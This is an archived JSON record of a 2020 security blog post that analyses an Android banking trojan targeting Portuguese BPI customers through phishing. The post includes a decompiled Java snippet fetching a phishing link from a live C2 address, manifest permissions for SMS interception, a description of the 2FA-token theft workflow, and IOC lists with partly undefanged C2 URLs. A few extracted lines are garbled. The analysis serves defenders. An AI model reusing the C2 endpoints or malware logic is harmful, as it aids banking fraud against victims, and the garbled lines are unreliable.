{
    "id": "ef850829-a192-4dfd-938e-1dd540e57e9e",
    "created_at": "2023-01-12T15:06:18.733023Z",
    "updated_at": "2025-03-27T02:06:07.466442Z",
    "deleted_at": null,
    "sha1_hash": "9bb0c3f8abccd49a065160f53709795746953339",
    "title": "2020-04-15 - Hackers are again attacking Portuguese banking organizations via Android Trojan-Banker",
    "authors": "",
    "file_creation_date": "2022-05-28T21:46:48Z",
    "file_modification_date": "2022-05-28T21:46:48Z",
    "file_size": 154789,
    "plain_text": "# Hackers are again attacking Portuguese banking organizations via Android Trojan- Banker\n\n**[seguranca-informatica.pt/hackers-are-again-attacking-portuguese-banking-organizations-via-android-trojan-banker/](https://seguranca-informatica.pt/hackers-are-again-attacking-portuguese-banking-organizations-via-android-trojan-banker/#.YHTDZS2tEUE)**\n\nApril 15, 2020\n\n**Hackers are again attacking Portuguese banking organizations via Android Trojan-Banker.**\nThe threat is not new, hackers are again attacking clients of Portuguese banking organizations via a specially crafted Android Trojan-Banker\nfrom phishing campaigns launched from Brazil.\n\nThe last occurrence this line was recorded on March 13rd, 2020, where a similar Trojan-Banker was disseminated targeting other clients of\ndifferent banking organizations.\n\n**List of some baking campaigns this Brazilian threat group has performed in Portugal:**\n\n[13/03 – Novo Banco Trojan-Banker](https://seguranca-informatica.pt/marco-2020-analise-reversa-da-app-android-entregue-com-o-phishing-do-novo-banco)\n\n12/03 – **[Caixa Geral Depósitos](https://seguranca-informatica.pt/campanha-de-phishing-em-nome-da-cgd-em-curso/)**\n\n[13/02 – Millennium BCP e Montepio](https://seguranca-informatica.pt/campanhas-de-phishing-em-curso-em-nome-dos-bancos-millenniumbcp-e-montepio/)\n\n[20/01 – Montepio e Millennium BCP](https://seguranca-informatica.pt/campanhas-de-phishing-em-curso-em-nome-dos-bancos-millenniumbcp-e-montepio/)\n\n[14/01 – Santander e Novo Banco](https://seguranca-informatica.pt/vagas-de-phishing-do-novo-banco-e-santander-curso/)\n\n[12-2019/01-2020: Lampion Trojan](https://seguranca-informatica.pt/targeting-portugal-a-new-trojan-lampion-has-spread-using-template-emails-from-the-portuguese-government-finance-tax/)\n\n(…)\n\nThe campaign starts with newly domain names that mimic the target organization. The domains are usually registered on the day before (or on\nthe same day) on which the threat occurs.\n\n[All the noticed campaigns have been registered on 0xSI_f33d, an open-sharing feed focused on malicious campaigns only targeting](https://feed.seguranca-informatica.pt/)\nPortuguese citizens.\n\n**_Figure 1: 0xSI_f33d – feed that compiles phishing and malware campaigns targeting only Portuguese citizens._**\n\nThese campaigns have been noticed from the beginning of 2020, where phishing and smishing campaigns are launched to target users\nprobably obtained via other malicious waves.\n\n\n-----\n\n-----\n\n**_Figure 3: Templates used in the malicious campaigns in Portugal._**\n\n**What is the main advantage of a malicious Android application instead of a simple phishing page asking for credentials?**\n\nThe answer is not immediate, but due to the various layers of protection during the authentication process that a system imposes on us today,\nthere is a need to validate authenticity and legitimacy during this action. To do this, a second authentication factor is generally used – which\ncorresponds to an SMS received on the user’s mobile phone – which immediately validates the potential trusted authentication in the system.\n\nAs an example, a simple phishing landing page, requesting access credentials, requires a semi-automated or fully manual process to collect\nthe next authentication factor – the SMS sent to the victim’s mobile phone.\n\n**_Figure 4: Semi-automated / manual process of a typical phishing campaign via landing page._**\n\nThe diagram in Figure 4, the process is time-consuming, and often complicated to manage by criminals. In a simplified way, 10 steps are\nnecessary for a successful authentication in the target homebanking portal.\n\n1. The victim accesses the phishing email or SMS.\n2. Victim credentials are introduced in the landing-page.\n3. Credentials are sent to a backoffice managed by the attackers.\n4. Attackers (in operator mode) are warned that a new “customer” is online – this represents a new infection.\n5. The attackers grab the actual process with the victim’s credentials, thus carrying out the first authentication step on the bank’s\n\n**portal.**\n\n\n-----\n\n6 **e ba** **s eg t** **ate se** **ce** **o s t e** **ct** **s p o e** **u** **be a d se ds t e to e** **(** **) o t e seco d aut e t cat o** **acto**\n7. The victim submits the token on the phishing page (landing page requesting the token).\n8. The token is sent to the backoffice.\n9. The operator again receives a notification that the authentication process is finished.\n10. The attacker completes the second authentication factor on the bank’s portal and performs legitimate operations.\n\nIn contrast, the same process performed through an Android application ends up solving the problem of the second authentication factor from\nthe attacker’s point of view, since the malicious android application, by itself, can manage the SMS of the victims’ devices.\n\n**_Figure 5: Infection process during a phishing campaign via malicious APK._**\n\nAs observed, through these types of scenarios it only takes 6 steps to get valid authentication on the bank’s portal.\n\n## Trojan Banker – Modus Operandi\n\nIn this section, some IOCs are shared regarding the last Android Banking-Trojan sample affecting a banking organization in Portugal (April\n15th 2020).\n\n\n-----\n\n**_Figure 6: Targeting landing-page to download the malicious Trojan Banker (April 15th, 2020)._**\n\nThe Android application runs on any type of device as long as the target SDK is higher than version 5. This detail guarantees an increase in\nthe scope of infection from the malicious point of view.\n\n\n-----\n\n-----\n\n**_gu e_** _e a d_ _pp_ _o_ _at o_ _sa_ _p e ( p_ _5t_ _0 0)_\n\nThe application requests too many privileges and is inappropriate for what it proposes to do. These type of details can be seen in the\napplication’s manifest file.\n\n\n-----\n\n-----\n\n**_Figure 8: Trojan Banker manifest permissions._**\n```\n<supports-screens android:anyDensity=\"true\" android:smallScreens=\"true\" android:normalScreens=\"true\" android:largeScreens=\"true\" />\n  <uses-permission android:name=\"android.permission.VIBRATE\" />\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\" />\n  <uses-permission android:name=\"android.permission.WAKE_LOCK\" />\n  <uses-permission android:name=\"android.permission.READ_SMS\" />\n  <uses-permission android:name=\"android.permission.INTERNET\" />\n  <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\" />\n  <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\" />\n  <uses-permission android:name=\"android.permission.WRITE_SYNC_SETTINGS\" />\n  <application android:label=\"BPIinstall\" android:icon=\"@drawable/icon\">\n    <activity android:label=\"BPIinstall\" android:name=\".main\" android:launchMode=\"singleTop\"\nandroid:screenOrientation=\"unspecified\" android:windowSoftInputMode=\"stateHidden\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.MAIN\" />\n        <category android:name=\"android.intent.category.LAUNCHER\" />\n      </intent-filter>\n    </activity>\n    <service android:name=\".starter\" />\n    <receiver android:name=\".starter$starter_BR\" />\n    <service android:name=\".bulacha\" />\n    <receiver android:name=\".bulacha$bulacha_BR\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n      </intent-filter>\n    </receiver>\n\n```\nIn detail, the victim when installing the application on his smartphone gives the application:\n\n**Reading SMS (used to obtain the token / PIN for the second authentication factor)**\n**Internet access for communication with C2 and landing page;**\n**Creation of background services on the smartphone; and**\n**Vibration and sleep control to prevent the smartphone from vibrating when receiving the SMS with the token and / or staying**\n**asleep, thus preventing the malicious app from accessing the SMS manager and sending the token to C2.**\n\nIn detail, there is a set of JAVA classes that contain the core of the malicious application, namely:\n\n**_pt/bn20/ptz/starter.java_**\n**_pt/bn20/ptz/main.java_**\n**_pt/bn20/ptz/b4xbitset.java_**\n**_pt/bn20/ptz/b4xorderedmap.java_**\n**_pt/bn20/ptz/webview.java_**\n**_pt/bn20/ptz/msgboxtemplate.java_**\n**_pt/bn20/ptz/b4xset.java_**\n**_pt/bn20/ptz/httpjob.java_**\n**_pt/bn20/ptz/httputils2service.java_**\n**_pt/bn20/ptz/bulacha.java_**\n**_pt/bn20/ptz/b4xbytesbuilder.java_**\n\n**These IOCs are the same used in other campaigns this line in Portugal. See all the information here (in Portuguese language).**\n\n[Março 2020: Análise reversa da app android entregue com o phishing do Novo Banco](https://seguranca-informatica.pt/marco-2020-analise-reversa-da-app-android-entregue-com-o-phishing-do-novo-banco/)\n\nThe malicious application has 2 activities, 3 services and 3 receivers. The most important details identified here are listed below.\n\n## Activities\n\n**.main: Activity launched in the foreground;**\n\n**.webview: Activity used to launch the bank’s phishing landing page.**\n\n\n-----\n\n**_Figure 9: Snipet of webViewWrapper. Here the landing-page is launched and presented._**\n\n## Services\n\n**.starter: Service that obtains the landing-page link from C2 (can be dynamic) and then be rendered in the**\n\n_.webview activity. This service also defines the data structure used and which stores information about the victim later sent to C2, as well as_\nadditional validations on the mobile device.\n\n\n-----\n\n**_Figure 10: Piece of code from the .starter service._**\n\nIn detail, the _service_create () routine validates whether the target version of the victim’s Android is included in the hardcoded list, and then\ndownloads the C2 landing-page URL.\n```\n public static String _service_create() throws Exception {\n    Common.LogImpl(\"3393219\", \"inicia tudo\", 0);\n    _nomemaquina = _xgerarstringsaleatorias(14);\n    _versaoandroid = _getandroidversion();\n    _url2 = \"http://186.235.91.100/extras/bpi_link.txt\";\n    if (_xhttputilsconnect4.IsInitialized()) {\n      return \"\";\n    }\n\n```\nThe URL for C2’s phishing page is as follows. Note that it can be changed dynamically in order to avoid blacklists.\n\n\n-----\n\n**_Figure 11: Landing-page URL provided by the C2 server._**\n\nThe C2 server is located in Rio de Janeiro, Brazil, thus confirming the origin of the threat.\n\n\n-----\n\n**_Figure 12: C2 geolocation – Brazil._**\n\n**.bulacha: Class that implements the methods used for information exfiltration, SMS management, etc.**\n\nWhen the service is created, the C2 is notified that the device is active, and the volume of the infected device is changed so that the victim is\nunaware of any potentially suspicious activity.\n\n\n-----\n\n**_Figure 13: The volume of the infected device is changed._**\n\nWhen the SMS is received after the victim enters the credentials on the bank’s landing page, the bank’s system sends the token / PIN to the\nuser’s mobile device now infected.\n\n**_Figure 14: Trojan-Banker reading the Token SMS sent from banking system with the token._**\n\nThe data is exfiltered and sent to C2 via an HTTP – POST request.\n\n\n-----\n\n**_Figure 15: Victim’s details sent to the C2 server geolocated in Brazil, São Paulo._**\n\nThe malicious application sends the details to C2 via an HTTP-POST request.\n\n**_Figure 16: HTTP request sent to the C2 server._**\n\nFinally, the victims’ credentials and tokens are managed on the C2 server available online on: hxxp://186.235.91[.]100, the same IP address\nused on the last campaigns this line in Portugal.\n\n\n-----\n\n**_Figure 17: C2 portal._**\n\n## Mitre Att&ck Matrix\n\n\n-----\n\n## Indicators of Compromise (IOCs)\n\n\n-----\n\n```\nMD5: 3f05afa8e5156d45614834627f652a55\nSize: 1.14MB\nhxxps://net24apk[.]website\nhxxps://sis-ptcadastro[.]com/app/BPI_Security.apk\nhxxps[://sis-ptcadastro.]com\nhxxps[://ptcadastro-sis.]com\nhxxps[://seguropt.]com/site/choose.]php\n--BPI banking (April 15th 2020)-http://186.235.91.100/extras/bpi_link.txt\nhttp://186.235.91.100/controls/bpi/control.php?message=\nhttp://186.235.91.100/controls/bpi/sms.php?apelido\nhttp://186.235.91.100/controls/bpi/sms.php\nhttp://186.235.91.100/controls/bpi/control.php?message=2\n-- Novo Banco (March 2020) --hxxp://186.235.91[.]100/extras/nb_link_lyly.txt\nhxxp://186.235.91[.]100/controls/nb/control.php?message=\nhxxp://186.235.91[.]100/controls/nb/sms.php?apelido=\nhxxp://186.235.91[.]100/controls/nb/sms\nhxxp://186.235.91[.]100/controls/nb/control.php?message=2\nC2\nhxxp://186.235.91[.]100\nMysql phpmyadmin\nhxxp://186.235.91[.]100/phpmyadmin/index[.]php\nOtherIOCs:\npackage=\"pt.bn20.ptz\"\n<service android:name=\".bulacha\" />\n<title>Operador MIB 1.0</title>\nhttps://www.virustotal.com/gui/ip-address/51.83.252.64/relations\n\n```\n[Pedro Tavares](https://seguranca-informatica.pt/author/pipocaz/)\n**[Pedro Tavares is a professional in the field of information security working as an Ethical Hacker/Pentester, Malware Researcher and also a](https://www.linkedin.com/in/sirpedrotavares/)**\n[Security Evangelist. He is also a founding member at CSIRT.UBI and Editor-in-Chief of the security computer blog seguranca-informatica.pt.](https://seguranca-informatica.pt/)\n\nIn recent years he has invested in the field of information security, exploring and analyzing a wide range of topics, such as pentesting (Kali\nLinux), malware, exploitation, hacking, IoT and security in Active Directory networks. He is also Freelance Writer (Infosec. Resources Institute\n[and Cyber Defense Magazine) and developer of the 0xSI_f33d – a feed that compiles phishing and malware campaigns targeting Portuguese](https://feed.seguranca-informatica.pt/)\ncitizens.\n\n[Read more here.](https://seguranca-informatica.pt/contacto/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-15 - Hackers are again attacking Portuguese banking organizations via Android Trojan-Banker.pdf"
    ],
    "report_names": [
        "2020-04-15 - Hackers are again attacking Portuguese banking organizations via Android Trojan-Banker.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535978,
    "ts_updated_at": 1743041167,
    "ts_creation_date": 1653774408,
    "ts_modification_date": 1653774408,
    "files": {
        "pdf": "https://archive.orkl.eu/9bb0c3f8abccd49a065160f53709795746953339.pdf",
        "text": "https://archive.orkl.eu/9bb0c3f8abccd49a065160f53709795746953339.txt",
        "img": "https://archive.orkl.eu/9bb0c3f8abccd49a065160f53709795746953339.jpg"
    }
}